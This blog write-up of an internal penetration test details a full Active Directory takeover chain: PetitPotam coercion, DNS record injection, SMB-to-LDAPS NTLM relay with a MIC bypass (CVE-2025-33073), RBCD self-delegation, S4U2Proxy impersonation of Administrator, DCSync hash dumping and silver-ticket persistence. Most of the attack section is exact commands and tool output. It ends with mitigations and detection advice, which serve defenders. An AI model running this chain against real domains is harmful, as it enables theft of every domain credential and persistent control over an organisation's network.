---
title: "When Every Relay Fails: Breaking Through with CVE-2025-33073"
date: 2025-12-08
draft: false
tags:
  - active-directory
  - ntlm-relay
  - rbcd
  - cve-2025-33073
  - internal-pentest
categories:
  - research
description: "Chaining CVE-2025-33073 (NTLM reflection with MIC bypass) and RBCD self-delegation to reach Domain Admin when every classic SMB/LDAP relay path is blocked by the client signing flag."
---

## The Setup That Looked Easy

Internal pentest. Low-privileged domain credentials provided by the client. Standard assumed-breach scenario.

Initial recon painted a promising picture:

```
nxc smb 10.10.10.0/24 -u testuser -p 'Provided2025!' --gen-relay-list relay.txt
```

Both Domain Controllers — **SMB signing disabled**. Coercion scan confirmed every flavor was on the menu:

```
nxc smb 10.10.10.11 -u testuser -p 'Provided2025!' -M coerce_plus
SMB  10.10.10.11  445  DC02  VULNERABLE, DFSCoerce
SMB  10.10.10.11  445  DC02  VULNERABLE, PetitPotam
SMB  10.10.10.11  445  DC02  VULNERABLE, PrinterBug
SMB  10.10.10.11  445  DC02  VULNERABLE, MSEven
```

SMB signing off on DCs + every coercion technique working = textbook relay scenario. Should be straightforward. Right?

## The Wall

### Attempt 1: Classic SMB Relay

Coerce DC02, relay to DC01:

```
# Terminal 1
sudo ntlmrelayx.py -t smb://10.10.10.10 -smb2support

# Terminal 2
python3 PetitPotam.py -u testuser -p 'Provided2025!' \
  -d corp.local 10.10.10.200 10.10.10.11
```

Auth succeeded. Execution failed:

```
[*] Authenticating against smb://10.10.10.10 as CORP/DC02$ SUCCEED
[-] DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
```

DC02's machine account doesn't have local admin on DC01. Authentication works, authorization doesn't. Relaying to every member server in the network gave the same result — the DC machine account had no admin rights anywhere.

### Attempt 2: Relay to LDAP

The real prize is LDAP relay — escalate our user to DCSync rights, or configure RBCD. Switch the target:

```
sudo ntlmrelayx.py -t ldap://10.10.10.10 --escalate-user testuser
```

Trigger coercion. Connection arrives:

```
[*] (SMB): Received connection from 10.10.10.11
[!] The client requested signing. Relaying to LDAP will not work!
[-] Authenticating against ldap://10.10.10.10 as CORP/DC02$ FAILED
```

Here's the catch that trips people up: **SMB signing being disabled on the server doesn't mean the client won't request it**. When a DC authenticates via SMB (even to a rogue server), it requests signing. LDAP sees that signing flag and rejects the relay. This happens regardless of the DC's own signing configuration.

The protocol compatibility looks like this:

```
SMB source  -->  SMB target:   Works (if target signing off)
SMB source  -->  LDAP target:  BLOCKED (client signing flag)
HTTP source -->  LDAP target:  Works (HTTP has no signing)
```

We need HTTP-based authentication to relay to LDAP.

### Attempt 3: HTTP via mitm6

IPv6 DNS poisoning to capture HTTP-based WPAD authentication:

```
# Terminal 1
sudo ntlmrelayx.py -t ldap://10.10.10.10 --delegate-access

# Terminal 2
sudo mitm6 -d corp.local
```

WPAD requests came in. Hours passed. We captured machine account WPAD requests, but never a user account with enough privileges to do anything useful. Dead end.

### Attempt 4: WebDAV Coercion

If we could force the DC to authenticate over HTTP instead of SMB, we'd bypass the signing issue. WebDAV coercion does exactly this — but it requires the WebClient service running on the target:

```
nxc smb 10.10.10.11 -u testuser -p 'Provided2025!' -M webdav
```

No output. WebClient service not running on the DC. And it almost never is. This is where most pentesters stop.

### The Pattern

Every path led to the same fundamental problem: we could make the DC authenticate to us via SMB, but couldn't relay that SMB authentication to LDAP because of the signing flag. And we couldn't get HTTP-based authentication because WebClient wasn't available.

We needed a way to relay SMB to LDAP **despite** the signing request.

## The Breakthrough: CVE-2025-33073

[CVE-2025-33073](https://github.com/mverschu/CVE-2025-33073) chains three components:

1. **DNS record injection** — any authenticated domain user can add DNS records by default
2. **NTLM coercion** — force DC to authenticate to our controlled hostname
3. **MIC bypass via patched Impacket** — strips the Message Integrity Code from the NTLM exchange, allowing cross-protocol relay from SMB to LDAPS

The MIC bypass is the key. The [decoder-it/impacket-partial-mic](https://github.com/decoder-it/impacket-partial-mic/) fork modifies ntlmrelayx to remove the SIGN/SEAL flags from the relayed authentication, which LDAPS accepts. Research from [decoder.cloud](https://decoder.cloud/2025/11/24/reflecting-your-authentication-when-windows-ends-up-talking-to-itself/) and [Depth Security](https://www.depthsecurity.com/blog/using-ntlm-reflection-to-own-active-directory/) documented this behavior.

### Setting It Up

The exploit automates the chain, but it's worth understanding the manual steps.

**Step 1: DNS Record Injection**

Create a DNS record pointing to our attack box:

```
python3 dnstool.py -u 'CORP\testuser' -p 'Provided2025!' \
  -a add -r 'evilrecord' -d 10.10.10.200 \
  --dns-ip 10.10.10.10 10.10.10.10   # --dns-ip = DNS server to update; trailing arg = target DC (both DC01)
```

Verify propagation:

```
nslookup evilrecord.corp.local 10.10.10.10
Name:   evilrecord.corp.local
Address: 10.10.10.200
```

Any authenticated user can do this. Default AD configuration.

**Step 2: Patched ntlmrelayx with MIC Removal**

The exploit's `setup.sh` creates a virtual environment with the forked Impacket. The critical flag is `--remove-mic-partial`:

```
source venv/bin/activate
ntlmrelayx.py -t ldaps://10.10.10.10 --remove-mic-partial \
  --escalate-user testuser
```

Note: targeting **LDAPS** (636), not LDAP (389). The MIC bypass works against the encrypted channel.

**Step 3: Trigger Coercion**

```
python3 PetitPotam.py -u testuser -p 'Provided2025!' \
  -d corp.local 10.10.10.200 10.10.10.11
```

PetitPotam forces DC02 to authenticate to our DNS record, which resolves to our attack box. The patched ntlmrelayx catches the SMB authentication, strips the MIC, and relays to LDAPS on DC01.

### The Moment

```
[*] (SMB): Received connection from 10.10.10.11
[*] Authenticating against ldaps://10.10.10.10 as CORP/DC02$ SUCCEED
[*] Started interactive Ldap shell via TCP on 127.0.0.1:11000
```

After hours of hitting walls — an LDAP shell as a Domain Controller machine account.

## From LDAP Shell to Domain Admin

### RBCD Self-Delegation

The LDAP shell runs as DC02$. First instinct was to escalate our user or set RBCD on DC01:

```
# grant_control DC=corp,DC=local testuser
Target not found

# set_rbcd DC01$ YOURPC$
Could not modify object... INSUFF_ACCESS_RIGHTS
```

DC02$ can authenticate to DC01's LDAP but can't modify DC01's objects. However, it CAN modify its own:

```
# set_rbcd DC02$ YOURPC$
Delegation rights modified successfully!
YOURPC$ can now impersonate users on DC02$ via S4U2Proxy
```

DC02$ has write access to its own `msDS-AllowedToActOnBehalfOfOtherIdentity`. And since DC02 is a Domain Controller, impersonating Administrator on DC02 gives us DCSync.

(We'd already created YOURPC$ earlier — Machine Account Quota was set to 10, another default that shouldn't be.)

### S4U2Proxy and DCSync

Request a service ticket impersonating Administrator:

```
getST.py -spn cifs/DC02.corp.local \
  -impersonate Administrator \
  CORP/'YOURPC$':'Password123!' -dc-ip 10.10.10.10
```

```
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_DC02.corp.local@CORP.LOCAL.ccache
```

Use the ticket to DCSync:

```
export KRB5CCNAME=Administrator@cifs_DC02.corp.local@CORP.LOCAL.ccache
secretsdump.py -k -no-pass DC02.corp.local
```

All domain hashes extracted. Domain Admin achieved.

### Persistence: Silver Ticket

For persistence, a silver ticket using DC02's machine hash:

```
ticketer.py -nthash <DC02_MACHINE_HASH> \
  -domain-sid S-1-5-21-XXXXXXXXXX \
  -domain corp.local \
  -spn cifs/DC02.corp.local \
  -user-id 500 Administrator
```

```
export KRB5CCNAME=Administrator.ccache
nxc smb DC02.corp.local -k --use-kcache
SMB  DC02.corp.local  445  DC02  [+] CORP\Administrator from ccache (Pwn3d!)
```

Interesting footnote: golden ticket was rejected with `KDC_ERR_TGT_REVOKED` — the client had rotated krbtgt. Silver ticket worked fine since it uses the machine account hash and never touches the KDC.

## The Full Chain

```
Authenticated domain user (low privilege)
    |
[1] DNS record injection (default AD permission)
    |
[2] PetitPotam coercion (unpatched EfsRpcEncryptFileSrv)
    |
[3] SMB --> LDAPS relay with MIC bypass (CVE-2025-33073)
    |
[4] LDAP shell as DC02$ machine account
    |
[5] RBCD self-delegation (DC02$ modifies own delegation)
    |
[6] S4U2Proxy: impersonate Administrator to DC02
    |
[7] DCSync: extract all domain credentials
    |
DOMAIN ADMIN
```

Total prerequisites: domain user credentials, PetitPotam (or any coercion) unpatched, CVE-2025-33073 unpatched, default Machine Account Quota.

## Mitigations

**Breaks the chain completely:**
- Patch CVE-2025-33073 (eliminates MIC bypass)
- Enable SMB signing on all systems including DCs (blocks relay regardless)
- Enable LDAP signing and channel binding (blocks LDAP relay)

**Reduces attack surface:**
- Set Machine Account Quota to 0 (blocks RBCD without existing machine account)
- Disable Print Spooler on DCs (removes one coercion vector)
- Patch PetitPotam and other coercion vulnerabilities
- Restrict DNS record creation (remove Authenticated Users from DNS zone ACL)

**Detection:**
- Monitor for new DNS record creation by non-admin accounts
- Alert on `msDS-AllowedToActOnBehalfOfOtherIdentity` modifications
- Monitor for S4U2Self/S4U2Proxy ticket requests from unexpected machine accounts
- Alert on DCSync replication from non-DC sources

## Takeaways

The traditional wisdom is "SMB signing off on DCs = easy relay." In practice, the SMB-to-LDAP signing barrier stops most relay chains cold. WebClient service is almost never running on DCs, so HTTP coercion isn't available either.

CVE-2025-33073's MIC bypass changes the equation entirely. Combined with RBCD self-delegation (a technique that gets less attention than it deserves), it creates a reliable path from any domain user to Domain Admin in environments where the "obvious" relay attacks all fail.

The broader lesson: when the straightforward path is blocked, the answer usually isn't "try harder on the same path" — it's "find a different protocol boundary to cross."
